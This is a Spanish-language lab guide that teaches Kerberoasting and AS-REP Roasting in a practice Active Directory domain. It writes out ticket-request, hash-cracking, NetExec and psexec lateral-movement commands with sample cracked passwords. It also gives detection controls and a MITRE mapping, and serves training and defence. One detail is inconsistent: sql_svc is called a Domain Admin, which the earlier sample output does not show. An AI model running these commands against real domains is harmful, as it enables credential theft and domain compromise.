# Lab 02 — Kerberoasting & AS-REP Roasting

## Objetivo

Obtener hashes de contraseñas de cuentas de servicio mediante ataques al protocolo Kerberos y crackearlos offline.

---

## Kerberos — Conceptos básicos

```
Cliente → AS_REQ  → KDC (DC)
KDC     → AS_REP  → Cliente (TGT cifrado con krbtgt hash)

Cliente → TGS_REQ → KDC (presenta TGT, pide ticket para servicio)
KDC     → TGS_REP → Cliente (TGS cifrado con el hash de la cuenta de servicio)

Cliente → AP_REQ  → Servidor de aplicación
```

**Kerberoasting:** cualquier usuario del dominio puede solicitar un TGS para cualquier servicio con SPN. El TGS está cifrado con el hash de la cuenta de servicio → crackeable offline.

---

## Parte 1 — Kerberoasting

### Listar cuentas con SPN

```bash
# Ver qué cuentas son kerberoasteables
GetUserSPNs.py labthinktank.local/jgarcia:Password123! \
    -dc-ip 192.168.100.10

# Output esperado:
# ServicePrincipalName                    Name       MemberOf
# MSSQLSvc/sql01.labthinktank.local:1433  sql_svc    
# HTTP/web01.labthinktank.local           admin_svc  Domain Admins
# BACKUP/backup01.labthinktank.local      backup_svc
```

### Solicitar los tickets (TGS)

```bash
# Solicitar y guardar hashes en formato hashcat
GetUserSPNs.py labthinktank.local/jgarcia:Password123! \
    -dc-ip 192.168.100.10 \
    -request \
    -outputfile /workspace/kerberoast_hashes.txt

# Ver el contenido
cat /workspace/kerberoast_hashes.txt
# $krb5tgs$23$*sql_svc$LABTHINKTANK.LOCAL$MSSQLSvc/sql01...
```

### Crackear los hashes

```bash
# hashcat — modo 13100 (Kerberos TGS-REP)
hashcat -m 13100 /workspace/kerberoast_hashes.txt \
    /usr/share/wordlists/rockyou.txt

# Con reglas (mayor cobertura)
hashcat -m 13100 /workspace/kerberoast_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --format=krb5tgs /workspace/kerberoast_hashes.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt

# Ver contraseñas crackeadas
hashcat -m 13100 /workspace/kerberoast_hashes.txt --show
```

### Resultado esperado

```
$krb5tgs$23$*sql_svc$...:sql_service_pass!
$krb5tgs$23$*backup_svc$...:Backup@2023
```

---

## Parte 2 — AS-REP Roasting

Cuando una cuenta tiene **"Do not require Kerberos preauthentication"** habilitado, cualquiera puede solicitar el AS-REP (cifrado con el hash de la contraseña del usuario) sin autenticarse.

### Identificar cuentas vulnerables

```bash
# Sin credenciales (si el DC lo permite)
GetNPUsers.py labthinktank.local/ -dc-ip 192.168.100.10 \
    -no-pass -usersfile /workspace/users.txt

# Con credenciales
GetNPUsers.py labthinktank.local/jgarcia:Password123! \
    -dc-ip 192.168.100.10 \
    -request \
    -format hashcat \
    -outputfile /workspace/asrep_hashes.txt

# Via LDAP — buscar usuarios con flag DONT_REQ_PREAUTH
ldapsearch -x -H ldap://192.168.100.10 \
    -D "jgarcia@labthinktank.local" -w "Password123!" \
    -b "DC=labthinktank,DC=local" \
    "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
    sAMAccountName
```

### Crackear los hashes AS-REP

```bash
# hashcat — modo 18200 (Kerberos AS-REP)
hashcat -m 18200 /workspace/asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt

# Resultado esperado:
# $krb5asrep$23$mlopez$...:Summer2024!
```

---

## Parte 3 — Kerberoasting con NetExec

```bash
# NetExec también puede realizar Kerberoasting
nxc ldap 192.168.100.10 \
    -u jgarcia -p "Password123!" \
    --kerberoasting /workspace/nxc_kerb.txt

# AS-REP Roasting con NetExec
nxc ldap 192.168.100.10 \
    -u jgarcia -p "Password123!" \
    --asreproast /workspace/nxc_asrep.txt
```

---

## Parte 4 — Post-Kerberoasting

Una vez crackeada la contraseña de `sql_svc` (Domain Admin):

```bash
# Verificar si sql_svc tiene privilegios de Domain Admin
nxc smb 192.168.100.10 \
    -u sql_svc -p "sql_service_pass!" \
    --groups "Domain Admins"

# Listar shares con la nueva cuenta
nxc smb 192.168.100.10 \
    -u sql_svc -p "sql_service_pass!" \
    --shares

# Conectarse al DC
psexec.py labthinktank.local/sql_svc:sql_service_pass!@192.168.100.10
```

---

## Detección y mitigaciones

| Control | Descripción |
|---------|-------------|
| Managed Service Accounts (MSA/gMSA) | Contraseñas automáticas de 120 chars — no crackeables |
| Kerberos AES encryption | Forzar AES256 en cuentas de servicio |
| Monitorear EventID 4769 | TGS-REQ con cifrado RC4 (Kerberoasting usa RC4 por defecto) |
| Auditar cuentas sin preauth | Deshabilitar DONT_REQ_PREAUTH en todas las cuentas |

---

## Actividades

1. Identificar todas las cuentas kerberoasteables del dominio
2. Obtener los hashes TGS y crackear al menos 2
3. Identificar la cuenta con AS-REP Roasting habilitada y crackear su hash
4. Con las credenciales obtenidas, determinar el nivel de privilegios de cada cuenta
5. Documentar el Event ID que generaría cada ataque en el SIEM

---

## Mapeo MITRE ATT&CK

| Técnica | TTP |
|---------|-----|
| Kerberoasting | T1558.003 |
| AS-REP Roasting | T1558.004 |
| Brute Force — Password Cracking | T1110.002 |
